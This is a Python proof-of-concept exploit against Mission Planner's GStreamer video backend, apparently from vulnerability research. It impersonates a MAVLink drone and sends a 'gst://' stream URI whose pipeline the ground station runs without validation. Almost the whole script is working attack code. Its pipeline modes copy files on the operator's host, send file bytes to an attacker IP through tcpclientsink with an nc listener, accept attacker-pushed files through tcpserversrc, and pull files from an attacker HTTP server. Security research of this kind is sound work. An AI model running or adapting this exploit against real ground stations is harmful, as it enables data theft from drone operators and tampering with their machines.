#!/usr/bin/env python3
"""
poc_G02_mp_gst_pipeline_exfil.py
================================================================================
Finding ID : G02
Target GCS : Mission Planner (GStreamer video backend)
Severity   : HIGH (arbitrary GStreamer pipeline -> filesystem read/write + network exfil)
Class      : CWE-20 (improper input validation) -> arbitrary gst_parse_launch()

WHAT THIS DEMONSTRATES
----------------------
A malicious vehicle sends VIDEO_STREAM_INFORMATION whose `uri` field begins with
`gst://`. Mission Planner passes the remainder verbatim to gst_parse_launch()
with NO validation — a developer debug backdoor left in production:

    ExtLibs/ArduPilot/Mavlink/CameraProtocol.cs:44-46  (GStreamerPipeline)
        // Allow a uri that starts with "gst://" to be used directly as a pipeline
        // (this is my personal hack to allow for custom pipelines for testing)
        if (uri.StartsWith("gst://"))
            return uri.Substring("gst://".Length);   // attacker pipeline, unvalidated

AUTO-TRIGGER PATH (no pipeline paste required):
    GimbalVideoControl.cs:765-793  (AutoConnectTimerCallback)
        - A System.Timers.Timer fires every 1 second from the GimbalVideoControl constructor
        - On each tick, if VideoStreams.Count > 0 it calls:
              _stream.Start(CameraProtocol.GStreamerPipeline(firstStream))
        - Operator action required: open the Camera/Gimbal screen in MP
        - Pipeline fires automatically within 1 second — no "Set GStreamer Source" click needed

This PoC demonstrates two escalating variants using only gst-plugins-base elements
(present in every MP GStreamer install, confirmed live-tested):

  Mode A — local file copy (default):
    filesrc location=<src> ! filesink location=<dst>
    Proves: arbitrary filesystem read + write on the operator host.

  Mode B — TCP network exfiltration (--nc-host / --nc-port):
    filesrc location=<src> ! tcpclientsink host=<attacker> port=<port>
    Proves: file bytes leave the Windows host to an attacker-controlled
    endpoint. Run `nc -l <port> > received.bin` on the attacker machine.

WHAT TO OBSERVE
---------------
1. Connect Mission Planner to tcp:<this-host>:5760 and wait for heartbeat.
2. Open the Camera or Gimbal screen in MP (the GimbalVideoControl view) Right click on map > Gimbal Video > Mini.
3. Within 1 second the AutoConnectTimer fires and the vehicle-supplied pipeline
   executes automatically — no "Set GStreamer Source" paste required.

Mode A: confirm gst_exfil_proof.bin appears on the Windows Desktop.
Mode B: confirm received.bin on the attacker machine contains the Windows file bytes.

Fallback (if GimbalVideoControl path is not reachable in this MP build):
  Right-click HUD video -> "Set GStreamer Source", clear, paste the pipeline the
  script prints, click OK. Same gst_parse_launch() sink, manual trigger.

SAFETY / AUTHORIZATION
----------------------
Authorized localhost/bench only. Both pipelines are BENIGN: they read a file
you name and either copy it locally or send it to your own listener. No
destructive elements.
"""
import os
import tempfile
import argparse
import socket
import struct
import sys
import threading
import time

os.environ["MAVLINK20"] = "1"   # force MAVLink 2 (needed for FTP / capabilities)

from pymavlink import mavutil
from pymavlink.mavutil import x25crc

# ---------------------------------------------------------------------------
# pretty output (matches ../../poc/mav_poc_harness.py conventions)
# ---------------------------------------------------------------------------
_C = {"hdr": "\033[1;36m", "obs": "\033[0;37m", "warn": "\033[1;33m",
      "ok": "\033[1;32m", "atk": "\033[1;31m", "rst": "\033[0m"}


def banner(title):
    line = "=" * max(8, min(78, len(title) + 4))
    print("%s%s\n  %s\n%s%s" % (_C["hdr"], line, title, line, _C["rst"]))


def observe(msg): print("%s[obs]%s %s" % (_C["obs"], _C["rst"], msg))
def warn(msg):    print("%s[!]  %s%s"  % (_C["warn"], msg, _C["rst"]))
def ok(msg):      print("%s[ok] %s%s"  % (_C["ok"], msg, _C["rst"]))
def attack(msg):  print("%s[atk]%s %s" % (_C["atk"], _C["rst"], msg))


# ===========================================================================
# Raw MAVLink2 framing for messages that the locally-installed pymavlink dialect
# does NOT know (COMPONENT_INFORMATION id=395, COMPONENT_METADATA id=397).
# ===========================================================================
_TYPE_SIZE = {
    "uint8_t": 1, "int8_t": 1, "char": 1, "uint16_t": 2, "int16_t": 2,
    "uint32_t": 4, "int32_t": 4, "float": 4, "uint64_t": 8, "int64_t": 8,
    "double": 8, "uint8_t_mavlink_version": 1,
}


def _crc_extra(name, fields):
    ordered = sorted(fields, key=lambda f: -_TYPE_SIZE[f[0]])  # stable -> ties keep order
    crc = x25crc()
    crc.accumulate_str(name + " ")
    for ftype, fname, alen in ordered:
        t = "uint8_t" if ftype == "uint8_t_mavlink_version" else ftype
        crc.accumulate_str(t + " ")
        crc.accumulate_str(fname + " ")
        if alen > 0:
            crc.accumulate(bytes([alen]))
    return (crc.crc & 0xFF) ^ (crc.crc >> 8)


def _wire_payload(fields, values):
    ordered = sorted(range(len(fields)), key=lambda i: -_TYPE_SIZE[fields[i][0]])
    fmt = "<"
    packed = b""
    for i in ordered:
        ftype, fname, alen = fields[i]
        v = values[fname]
        if alen > 0 and ftype in ("char", "uint8_t", "int8_t"):
            if isinstance(v, str):
                v = v.encode("utf-8", "replace")
            v = (v + b"\x00" * alen)[:alen]
            packed += v
        elif alen > 0:
            raise NotImplementedError("non-byte arrays not needed here")
        else:
            packed += struct.pack({"uint32_t": "<I", "int32_t": "<i", "uint16_t": "<H",
                                   "int16_t": "<h", "uint8_t": "<B", "int8_t": "<b",
                                   "float": "<f"}[ftype], v)
    return packed


_MSG_COMPONENT_METADATA = (
    397, "COMPONENT_METADATA",
    [("uint32_t", "time_boot_ms", 0),
     ("uint32_t", "file_crc", 0),
     ("char", "uri", 100)],
)
_MSG_COMPONENT_INFORMATION = (
    395, "COMPONENT_INFORMATION",
    [("uint32_t", "time_boot_ms", 0),
     ("uint32_t", "general_metadata_file_crc", 0),
     ("uint32_t", "peripherals_metadata_file_crc", 0),
     ("char", "general_metadata_uri", 100),
     ("char", "peripherals_metadata_uri", 100)],
)


# ===========================================================================
# FakeVehicle
# ===========================================================================
class FakeVehicle:
    HEARTBEAT_HZ = 1.0

    # SITL/Drone profile constants
    PARAMS = {
        "SYSID_THISMAV": 1.0, "FRAME_CLASS": 1.0, "FRAME_TYPE": 1.0,
        "BATT_CAPACITY": 5000.0, "FENCE_ENABLE": 0.0, "ARMING_CHECK": 1.0,
    }

    FW_VERSION = (4 << 24) | (5 << 16) | (7 << 8) | 255      # major.minor.patch.type
    GIT_HASH = list(b"1f3a9c20")                              # 8 bytes
    BOARD_VERSION = 0x010F0000
    VENDOR_ID, PRODUCT_ID, UID = 0x2DAE, 0x1011, 0x3138353012345678

    CAPABILITIES = (
        mavutil.mavlink.MAV_PROTOCOL_CAPABILITY_FTP
        | mavutil.mavlink.MAV_PROTOCOL_CAPABILITY_MISSION_FLOAT
        | mavutil.mavlink.MAV_PROTOCOL_CAPABILITY_PARAM_FLOAT
        | mavutil.mavlink.MAV_PROTOCOL_CAPABILITY_MISSION_INT
        | mavutil.mavlink.MAV_PROTOCOL_CAPABILITY_COMMAND_INT
        | mavutil.mavlink.MAV_PROTOCOL_CAPABILITY_SET_POSITION_TARGET_LOCAL_NED
        | mavutil.mavlink.MAV_PROTOCOL_CAPABILITY_SET_POSITION_TARGET_GLOBAL_INT
        | mavutil.mavlink.MAV_PROTOCOL_CAPABILITY_TERRAIN
        | mavutil.mavlink.MAV_PROTOCOL_CAPABILITY_FLIGHT_TERMINATION
        | mavutil.mavlink.MAV_PROTOCOL_CAPABILITY_COMPASS_CALIBRATION
        | mavutil.mavlink.MAV_PROTOCOL_CAPABILITY_MAVLINK2
        | mavutil.mavlink.MAV_PROTOCOL_CAPABILITY_MISSION_FENCE
        | mavutil.mavlink.MAV_PROTOCOL_CAPABILITY_MISSION_RALLY
    )

    BOOT_BANNER = [
        "ArduCopter V4.5.7 (1f3a9c20)",
        "ChibiOS: db580d2e",
        "CubeOrange 0042002A",
        "Frame: QUAD/X",
        "IMU0: fast sampling 8.0kHz",
        "RCOut: PWM:1-14",
    ]

    def __init__(self, conn_str, sysid=1, compid=1, verbose=True, dialect="ardupilotmega"):
        self.conn_str = conn_str
        self.sysid = sysid
        self.compid = compid
        self.verbose = verbose
        self.dialect = dialect
        self.master = None
        self._hb_thread = None
        self._rx_thread = None
        self._running = False
        self._seq_lock = threading.Lock()
        
        self.greeted = False
        
        self.ftp_files = {}
        self.ftp_dir_entries = []     # list of (name, size, is_dir)
        self._ftp_sessions = {}       # session_id -> (filename, bytes)

    # -- construction --------------------------------------------------------
    @classmethod
    def from_cli(cls, title=None, extra_args=None):
        p = argparse.ArgumentParser(add_help=True, description=title or "fake malicious vehicle")
        g = p.add_mutually_exclusive_group()
        g.add_argument("--listen", metavar="HOST:PORT", default="127.0.0.1:5760",
                       help="bind a TCP server the GCS connects TO (SITL-style). default 127.0.0.1:5760")
        g.add_argument("--udpout", metavar="HOST:PORT",
                       help="push UDP to a listening GCS, e.g. 127.0.0.1:14550")
        g.add_argument("--connect", metavar="STR",
                       help="raw pymavlink connection string, used verbatim")
        p.add_argument("--sysid", type=int, default=1, help="our advertised system id (default 1)")
        p.add_argument("--compid", type=int, default=1, help="our advertised component id (default 1 = autopilot)")
        p.add_argument("--quiet", action="store_true", help="less logging")
        if extra_args:
            extra_args(p)
        a, _ = p.parse_known_args()

        if a.connect:
            conn = a.connect
        elif a.udpout:
            conn = "udpout:" + a.udpout
        else:
            conn = "tcpin:" + a.listen
        self = cls(conn, sysid=a.sysid, compid=a.compid, verbose=not a.quiet)
        self._args = a
        return self

    # -- lifecycle -----------------------------------------------------------
    def start(self):
        if self.verbose:
            observe("opening attacker link: %s (advertising sysid=%d compid=%d)"
                    % (self.conn_str, self.sysid, self.compid))
            if self.conn_str.startswith("tcpin:"):
                observe("waiting for the GCS to CONNECT to us (point it at tcp:%s) ..."
                        % self.conn_str[len("tcpin:"):])
        self.master = mavutil.mavlink_connection(
            self.conn_str, source_system=self.sysid, source_component=self.compid,
            dialect=self.dialect, autoreconnect=True)
        self._running = True
        self._hb_thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
        self._hb_thread.start()
        self._rx_thread = threading.Thread(target=self._rx_loop, daemon=True)
        self._rx_thread.start()
        if self.verbose:
            ok("link up; HEARTBEAT @ %.0f Hz running" % self.HEARTBEAT_HZ)
        return self

    def wait_for_gcs(self, timeout=120):
        if not self.conn_str.startswith("tcpin:"):
            time.sleep(0.3)
            return True
        deadline = time.time() + timeout
        if self.verbose:
            observe("waiting for a GCS to connect to %s ..." % self.conn_str)
        while time.time() < deadline:
            if getattr(self.master, "port", None) is not None:
                time.sleep(0.3)
                if self.verbose:
                    ok("GCS connected — sending payload")
                return True
            time.sleep(0.1)
        warn("no GCS connected within %ds" % timeout)
        return False

    def serve_forever(self):
        try:
            while self._running:
                time.sleep(0.5)
        except KeyboardInterrupt:
            warn("Ctrl-C — shutting down fake vehicle")
            self.stop()

    def stop(self):
        self._running = False

    # -- drone.py behavior helpers -------------------------------------------
    def send_autopilot_version(self):
        self.master.mav.autopilot_version_send(
            self.CAPABILITIES, self.FW_VERSION, self.FW_VERSION, 0,
            self.BOARD_VERSION, self.GIT_HASH, self.GIT_HASH, [0] * 8,
            self.VENDOR_ID, self.PRODUCT_ID, self.UID)

    def send_boot_banner(self):
        for line in self.BOOT_BANNER:
            self.send_statustext(line)

    # -- heartbeat -----------------------------------------------------------
    def _heartbeat_loop(self):
        period = 1.0 / self.HEARTBEAT_HZ
        while self._running:
            try:
                self.master.mav.heartbeat_send(
                    mavutil.mavlink.MAV_TYPE_QUADROTOR,
                    mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
                    base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
                    custom_mode=0,
                    system_status=mavutil.mavlink.MAV_STATE_STANDBY)
                
                # Periodically send sys_status like the drone.py script
                self.master.mav.sys_status_send(
                    0x3FFFFFFF, 0x3FFFFFFF, 0x3FFFFFFF, 250,
                    12600, 1500, 87, 0, 0, 0, 0, 0, 0)
            except Exception as e:
                if self.verbose:
                    warn("heartbeat send failed (link not up yet?): %s" % e)
            time.sleep(period)

    # -- receive / log what the GCS asks for --------------------------------
    def _rx_loop(self):
        while self._running:
            try:
                msg = self.master.recv_match(blocking=True, timeout=0.5)
            except Exception:
                msg = None
                time.sleep(0.2)
            if msg is None:
                continue
            
            t = msg.get_type()
            if t == "BAD_DATA":
                continue
            
            # Initialization triggers
            if t == "HEARTBEAT" and not self.greeted:
                self.greeted = True
                self.send_boot_banner()
                self.send_autopilot_version()

            if t == "FILE_TRANSFER_PROTOCOL":
                self._handle_ftp(msg)
            
            elif t == "PARAM_REQUEST_LIST":
                if self.verbose: observe("GCS requested PARAM_REQUEST_LIST")
                for i, (name, val) in enumerate(self.PARAMS.items()):
                    self.send_param_value(name, val, count=len(self.PARAMS), index=i)

            elif t == "PARAM_REQUEST_READ":
                if hasattr(msg, "param_id"):
                    param_name = msg.param_id
                    if isinstance(param_name, bytes):
                        param_name = param_name.decode("utf-8", "ignore")
                    param_name = param_name.strip("\x00")
                    if param_name in self.PARAMS:
                        idx = list(self.PARAMS.keys()).index(param_name)
                        self.send_param_value(param_name, self.PARAMS[param_name], count=len(self.PARAMS), index=idx)

            elif t == "AUTOPILOT_VERSION_REQUEST":
                self.send_autopilot_version()

            elif t in ("COMMAND_LONG", "COMMAND_INT"):
                c = msg.command
                if self.verbose:
                    observe("GCS sent %s command=%d param1=%s" % (t, c, getattr(msg, "param1", "?")))
                if c == mavutil.mavlink.MAV_CMD_REQUEST_AUTOPILOT_CAPABILITIES:
                    self.send_autopilot_version()
                    self.master.mav.command_ack_send(c, mavutil.mavlink.MAV_RESULT_ACCEPTED)
                elif c == getattr(mavutil.mavlink, "MAV_CMD_REQUEST_MESSAGE", 512):
                    p1 = int(msg.param1)
                    if p1 == mavutil.mavlink.MAVLINK_MSG_ID_AUTOPILOT_VERSION:
                        self.send_autopilot_version()
                    elif p1 == mavutil.mavlink.MAVLINK_MSG_ID_CAMERA_INFORMATION:
                        # CameraProtocol.RequestCameraInformationAsync() asks for this;
                        # without a reply it never initialises VideoStreams and
                        # GimbalVideoControl.AutoConnectTimer loops forever requesting.
                        self.send_camera_information(
                            vendor_name=b"ArduPilot",
                            model_name=b"CubeOrange",
                            cam_definition_uri=b"",
                            flags=mavutil.mavlink.CAMERA_CAP_FLAGS_HAS_VIDEO_STREAM)
                        if self.verbose:
                            ok("replied CAMERA_INFORMATION to MP request")
                    elif p1 == mavutil.mavlink.MAVLINK_MSG_ID_VIDEO_STREAM_INFORMATION:
                        # Send the malicious stream immediately on demand
                        if hasattr(self, "_poc_pipeline"):
                            self.send_video_stream_information(uri=self._poc_pipeline)
                        if self.verbose:
                            ok("replied VIDEO_STREAM_INFORMATION to MP request")
                    self.master.mav.command_ack_send(c, mavutil.mavlink.MAV_RESULT_ACCEPTED)

    # -- generic raw send for dialect-unknown messages ----------------------
    def _send_raw(self, msgid, name, fields, crc_extra, values):
        payload = _wire_payload(fields, values)
        trimmed = payload.rstrip(b"\x00")
        if len(trimmed) == 0:
            trimmed = b"\x00"
        with self._seq_lock:
            seq = self.master.mav.seq & 0xFF
            self.master.mav.seq = (self.master.mav.seq + 1) % 256
        hdr = struct.pack("<BBBBBB", len(trimmed), 0, 0, seq, self.sysid, self.compid)
        hdr += struct.pack("<BBB", msgid & 0xFF, (msgid >> 8) & 0xFF, (msgid >> 16) & 0xFF)
        frame = b"\xfd" + hdr + trimmed
        crc = x25crc(frame[1:])
        crc.accumulate(bytes([crc_extra]))
        frame += struct.pack("<H", crc.crc)
        self.master.write(frame)
        if self.verbose:
            attack("sent raw %s (id=%d, %d payload bytes) -> GCS" % (name, msgid, len(trimmed)))

    # ======================================================================
    # Finding-specific payload helpers
    # ======================================================================
    def send_statustext(self, text, severity=mavutil.mavlink.MAV_SEVERITY_INFO):
        data = text.encode("utf-8", "replace")[:50]
        self.master.mav.statustext_send(severity, data)
        if self.verbose:
            attack("sent STATUSTEXT severity=%d text=%r" % (severity, text))

    def send_camera_information(self, vendor_name=b"", model_name=b"",
                                cam_definition_uri=b"", cam_definition_version=1,
                                flags=None):
        if isinstance(vendor_name, str):
            vendor_name = vendor_name.encode("utf-8", "replace")
        if isinstance(model_name, str):
            model_name = model_name.encode("utf-8", "replace")
        if isinstance(cam_definition_uri, str):
            cam_definition_uri = cam_definition_uri.encode("utf-8", "replace")
        if flags is None:
            flags = mavutil.mavlink.CAMERA_CAP_FLAGS_HAS_VIDEO_STREAM
        v = list((vendor_name + b"\x00" * 32)[:32])
        mdl = list((model_name + b"\x00" * 32)[:32])
        from pymavlink.dialects.v20 import ardupilotmega as _M
        msg = _M.MAVLink_camera_information_message(
            int(time.time() * 1000) & 0xFFFFFFFF,  # time_boot_ms
            v, mdl,                                 # vendor_name, model_name (uint8[32])
            0,                                      # firmware_version
            0.0, 0.0, 0.0,                          # focal_length, sensor_size_h/v
            0, 0,                                   # resolution_h/v
            0,                                      # lens_id
            flags,                                  # flags
            cam_definition_version,                 # cam_definition_version
            cam_definition_uri)                     # cam_definition_uri (char[140])
        self.master.mav.send(msg)
        if self.verbose:
            attack("sent CAMERA_INFORMATION vendor=%r model=%r uri=%r"
                   % (vendor_name, model_name, cam_definition_uri))

    def send_video_stream_information(self, uri=b"", name=b"poc", stream_id=1,
                                      count=1, vtype=None):
        if isinstance(uri, str):
            uri = uri.encode("utf-8", "replace")
        if isinstance(name, str):
            name = name.encode("utf-8", "replace")
        if vtype is None:
            vtype = mavutil.mavlink.VIDEO_STREAM_TYPE_RTSP
        from pymavlink.dialects.v20 import ardupilotmega as _M
        msg = _M.MAVLink_video_stream_information_message(
            stream_id, count, vtype,
            mavutil.mavlink.VIDEO_STREAM_STATUS_FLAGS_RUNNING,  # flags
            30.0,            # framerate
            1280, 720,       # resolution_h/v
            4000,            # bitrate
            0,               # rotation
            90,              # hfov
            name,            # name (char[32])
            uri)             # uri (char[160])
        self.master.mav.send(msg)
        if self.verbose:
            attack("sent VIDEO_STREAM_INFORMATION uri=%r" % uri)

    def send_param_value(self, param_id, value, ptype=None, count=1, index=0):
        if ptype is None:
            ptype = mavutil.mavlink.MAV_PARAM_TYPE_REAL32
        if isinstance(param_id, str):
            param_id = param_id.encode("utf-8", "replace")
        self.master.mav.param_value_send(param_id, float(value), ptype, count, index)

    def send_component_metadata(self, uri, file_crc=0):
        msgid, name, fields = _MSG_COMPONENT_METADATA
        self._send_raw(msgid, name, fields, 182, {
            "time_boot_ms": int(time.time() * 1000) & 0xFFFFFFFF,
            "file_crc": file_crc & 0xFFFFFFFF,
            "uri": uri,
        })
        if self.verbose:
            attack("sent COMPONENT_METADATA uri=%r" % uri)

    def send_component_information(self, general_uri, peripherals_uri="",
                                   general_crc=0, peripherals_crc=0):
        msgid, name, fields = _MSG_COMPONENT_INFORMATION
        self._send_raw(msgid, name, fields, 0, {
            "time_boot_ms": int(time.time() * 1000) & 0xFFFFFFFF,
            "general_metadata_file_crc": general_crc & 0xFFFFFFFF,
            "peripherals_metadata_file_crc": peripherals_crc & 0xFFFFFFFF,
            "general_metadata_uri": general_uri,
            "peripherals_metadata_uri": peripherals_uri,
        })
        if self.verbose:
            attack("sent COMPONENT_INFORMATION general_uri=%r" % general_uri)

    # ======================================================================
    # MAVLink-FTP SERVER
    # ======================================================================
    PAYLOAD_LEN = 251
    HDR = 12
    MAX_DATA = PAYLOAD_LEN - HDR        # 239 data bytes
    
    OP_NONE = 0
    OP_TERMINATE = 1
    OP_RESET = 2
    OP_LIST = 3
    OP_OPEN_RO = 4
    OP_READ = 5
    OP_OPEN_WO = 6
    OP_BURST_READ = 15
    OP_ACK = 128
    OP_NACK = 129
    
    ERR_FAIL = 1
    ERR_EOF = 6
    ERR_FILE_NOT_FOUND = 10

    def add_ftp_file(self, name, content):
        if isinstance(content, str):
            content = content.encode("utf-8")
        self.ftp_files[name] = content

    def add_ftp_dir_entry(self, name, size=None, is_dir=False):
        if size is None:
            size = len(self.ftp_files.get(name, b""))
        self.ftp_dir_entries.append((name, size, is_dir))

    def _ftp_reply(self, req, opcode, size=0, req_opcode=0, burst=0, offset=0,
                   data=b"", session=None):
        p = bytearray(self.PAYLOAD_LEN)
        struct.pack_into("<H", p, 0, req["seq"] + 1 & 0xFFFF)
        p[2] = (req["session"] if session is None else session) & 0xFF
        p[3] = opcode & 0xFF
        p[4] = size & 0xFF
        p[5] = req_opcode & 0xFF
        p[6] = burst & 0xFF
        struct.pack_into("<I", p, 8, offset & 0xFFFFFFFF)
        d = data[:self.MAX_DATA]
        p[self.HDR:self.HDR + len(d)] = d
        self.master.mav.file_transfer_protocol_send(0, req["src_sys"], req["src_comp"], list(p))

    def _handle_ftp(self, msg):
        raw = bytes(bytearray(msg.payload))
        req = {
            "seq": struct.unpack_from("<H", raw, 0)[0],
            "session": raw[2],
            "opcode": raw[3],
            "size": raw[4],
            "req_opcode": raw[5],
            "burst": raw[6],
            "offset": struct.unpack_from("<I", raw, 8)[0],
            "data": raw[self.HDR:self.HDR + raw[4]],
            "src_sys": msg.get_srcSystem(),
            "src_comp": msg.get_srcComponent(),
        }
        op = req["opcode"]

        if op == self.OP_LIST:
            self._ftp_list(req)
        elif op == self.OP_OPEN_RO:
            self._ftp_open_ro(req)
        elif op == self.OP_READ:
            self._ftp_read(req, burst=False)
        elif op == self.OP_BURST_READ:
            self._ftp_read(req, burst=True)
        elif op == self.OP_TERMINATE or op == self.OP_RESET:
            self._ftp_sessions.pop(req["session"], None)
            self._ftp_reply(req, self.OP_ACK, req_opcode=op)
        else:
            self._ftp_reply(req, self.OP_NACK, size=1, req_opcode=op, data=bytes([self.ERR_FAIL]))

    def _ftp_list(self, req):
        offset = req["offset"]
        if offset >= len(self.ftp_dir_entries):
            self._ftp_reply(req, self.OP_NACK, size=1, req_opcode=self.OP_LIST,
                            data=bytes([self.ERR_EOF]))
            return
        blob = b""
        i = offset
        while i < len(self.ftp_dir_entries):
            name, size, is_dir = self.ftp_dir_entries[i]
            if is_dir:
                entry = b"D" + name.encode("utf-8") + b"\x00"
            else:
                entry = b"F" + ("%s\t%d" % (name, size)).encode("utf-8") + b"\x00"
            if len(blob) + len(entry) > self.MAX_DATA:
                break
            blob += entry
            i += 1
        self._ftp_reply(req, self.OP_ACK, size=len(blob), req_opcode=self.OP_LIST,
                        offset=offset, data=blob)

    def _resolve_ftp_file(self, path_bytes):
        path = path_bytes.decode("utf-8", "replace").lstrip("/")
        if path in self.ftp_files:
            return path, self.ftp_files[path]
        for k, v in self.ftp_files.items():
            if k.lstrip("/").replace("\\", "/").endswith(path.replace("\\", "/")):
                return k, v
        if len(self.ftp_files) == 1:
            k = next(iter(self.ftp_files))
            return k, self.ftp_files[k]
        return None, None

    def _ftp_open_ro(self, req):
        name, content = self._resolve_ftp_file(req["data"])
        if content is None:
            self._ftp_reply(req, self.OP_NACK, size=1, req_opcode=self.OP_OPEN_RO,
                            data=bytes([self.ERR_FILE_NOT_FOUND]))
            return
        session = (max(self._ftp_sessions) + 1) if self._ftp_sessions else 1
        self._ftp_sessions[session] = (name, content)
        self._ftp_reply(req, self.OP_ACK, size=4, req_opcode=self.OP_OPEN_RO,
                        data=struct.pack("<I", len(content)), session=session)

    def _ftp_read(self, req, burst):
        sess = self._ftp_sessions.get(req["session"])
        if sess is None:
            self._ftp_reply(req, self.OP_NACK, size=1,
                            req_opcode=self.OP_BURST_READ if burst else self.OP_READ,
                            data=bytes([self.ERR_FAIL]))
            return
        _name, content = sess
        offset = req["offset"]
        if offset >= len(content):
            self._ftp_reply(req, self.OP_NACK, size=1,
                            req_opcode=self.OP_BURST_READ if burst else self.OP_READ,
                            data=bytes([self.ERR_EOF]))
            return
        if not burst:
            chunk = content[offset:offset + min(req["size"] or self.MAX_DATA, self.MAX_DATA)]
            self._ftp_reply(req, self.OP_ACK, size=len(chunk), req_opcode=self.OP_READ,
                            offset=offset, data=chunk)
            return
        pos = offset
        while pos < len(content):
            chunk = content[pos:pos + self.MAX_DATA]
            pos += len(chunk)
            last = pos >= len(content)
            self._ftp_reply(req, self.OP_ACK, size=len(chunk), req_opcode=self.OP_BURST_READ,
                            burst=1 if last else 0, offset=pos - len(chunk), data=chunk)

# ---------------------------------------------------------------------------
# self-test
# ---------------------------------------------------------------------------
def _selftest():
    cam = [("uint32_t", "time_boot_ms", 0), ("uint8_t", "vendor_name", 32),
           ("uint8_t", "model_name", 32), ("uint32_t", "firmware_version", 0),
           ("float", "focal_length", 0), ("float", "sensor_size_h", 0),
           ("float", "sensor_size_v", 0), ("uint16_t", "resolution_h", 0),
           ("uint16_t", "resolution_v", 0), ("uint8_t", "lens_id", 0),
           ("uint32_t", "flags", 0), ("uint16_t", "cam_definition_version", 0),
           ("char", "cam_definition_uri", 140)]
    got = _crc_extra("CAMERA_INFORMATION", cam)
    assert got == 92, "CAMERA_INFORMATION crc_extra %d != 92" % got
    assert _crc_extra(*_MSG_COMPONENT_METADATA[1:]) == 182, "COMPONENT_METADATA crc_extra mismatch"
    assert _crc_extra(*_MSG_COMPONENT_INFORMATION[1:]) == 0, "COMPONENT_INFORMATION crc_extra mismatch"
    ok("selftest OK: CRC_EXTRA(CAMERA_INFORMATION)=92, COMPONENT_METADATA=182, COMPONENT_INFORMATION=0")


def extra(p):
    p.add_argument("--exfil-file", default=None,
                   help="Mode A/B: Windows path of file for the pipeline to read (default: C:/Users/Public/gst_poc_marker.txt)")
    p.add_argument("--out-file", default=None,
                   help="Mode A/C: Windows path to write bytes to (default: C:/Users/Public/Desktop/gst_exfil_proof.bin)")
    p.add_argument("--nc-host", default=None,
                   help="Mode B: attacker IP to TCP-exfil bytes to (enables tcpclientsink mode)")
    p.add_argument("--nc-port", type=int, default=9999,
                   help="Mode B/C port (default 9999). B: run nc -l <port> > received.bin  C: cat file | nc <WIN_IP> <port>")
    p.add_argument("--inject", action="store_true",
                   help="Mode C: write attacker-supplied file TO the Windows host via tcpserversrc")
    p.add_argument("--pull-url", default=None,
                   help="Mode D: Windows pulls file from this HTTP URL and writes it locally (souphttpsrc). "
                        "Run: python3 -m http.server 8000 on attacker machine.")


def main():
    banner("G02: Mission Planner gst:// VIDEO_STREAM_INFORMATION pipeline injection")
    warn("BENIGN PoC. Authorized localhost/bench Mission Planner only.")

    v = FakeVehicle.from_cli("G02 gst pipeline injection", extra_args=extra)
    a = v._args

    dst = (a.out_file or "C:/Users/Public/Desktop/gst_exfil_proof.bin").replace("\\", "/")

    if a.pull_url:
        # Mode D: Windows pulls from attacker HTTP server (pull-based, no timing race)
        # Run: python3 -m http.server 8000 on attacker machine, place file in served dir
        raw_pipeline = "souphttpsrc location=%s ! filesink location=%s" % (a.pull_url, dst)
        observe("Mode D — attacker HTTP pull via souphttpsrc")
        observe("Attacker URL: %s" % a.pull_url)
        observe("Write dest  : %s" % dst)
        observe("Serve file  : python3 -m http.server 8000  (put file in that directory)")
    elif a.inject:
        # Mode C: attacker pushes file content TO the Windows host
        # Pipeline: Windows listens on TCP, attacker connects and streams bytes, filesink writes them
        raw_pipeline = "tcpserversrc host=0.0.0.0 port=%d ! filesink location=%s" % (a.nc_port, dst)
        observe("Mode C — attacker-to-target write via tcpserversrc")
        observe("Windows will listen on port %d" % a.nc_port)
        observe("Write dest  : %s" % dst)
        observe("Push file   : cat <your_file> | nc <WINDOWS_IP> %d" % a.nc_port)
    elif a.nc_host:
        # Mode B: TCP network exfiltration via tcpclientsink (gst-plugins-base)
        src = (a.exfil_file or "C:/Users/Public/gst_poc_marker.txt").replace("\\", "/")
        raw_pipeline = "filesrc location=%s ! tcpclientsink host=%s port=%d" % (src, a.nc_host, a.nc_port)
        observe("Mode B — network exfil via tcpclientsink")
        observe("Source file : %s" % src)
        observe("Exfil dest  : %s:%d  (run: nc -l %d > received.bin)" % (a.nc_host, a.nc_port, a.nc_port))
    else:
        # Mode A: local file copy via filesink (gst-plugins-base)
        src = (a.exfil_file or "C:/Users/Public/gst_poc_marker.txt").replace("\\", "/")
        raw_pipeline = "filesrc location=%s ! filesink location=%s" % (src, dst)
        observe("Mode A — local file copy via filesink")
        observe("Source file : %s" % src)
        observe("Proof drop  : %s  (check Windows host after pipeline fires)" % dst)

    pipeline = "gst://" + raw_pipeline
    observe("VIDEO_STREAM_INFORMATION.uri = %r" % pipeline)
    observe("Sink: CameraProtocol.cs:44 gst:// passthrough -> gst_parse_launch()")

    v._poc_pipeline = pipeline   # expose to rx loop for on-demand replies

    v.start()
    if not v.wait_for_gcs():
        warn("No GCS connected; exiting.")
        return
    ok("GCS connected. Streaming the malicious VIDEO_STREAM_INFORMATION.")
    attack("AUTO-TRIGGER path:")
    attack("  1. Right-click the MAP area (not HUD) in MP Flight Data screen.")
    attack("  2. Look for 'Gimbal Video Full Size' or 'Gimbal Video Mini' and click it.")
    attack("  3. GimbalVideoControl.AutoConnectTimer fires within 1s -> pipeline executes.")
    attack("  Pipeline: " + raw_pipeline)
    warn("Fallback: right-click HUD video -> Set GStreamer Source, clear, paste pipeline, OK.")
    try:
        while True:
            v.send_video_stream_information(uri=pipeline)
            time.sleep(2.0)
    except KeyboardInterrupt:
        warn("Ctrl-C — done.")
        v.stop()


if __name__ == "__main__":
    main()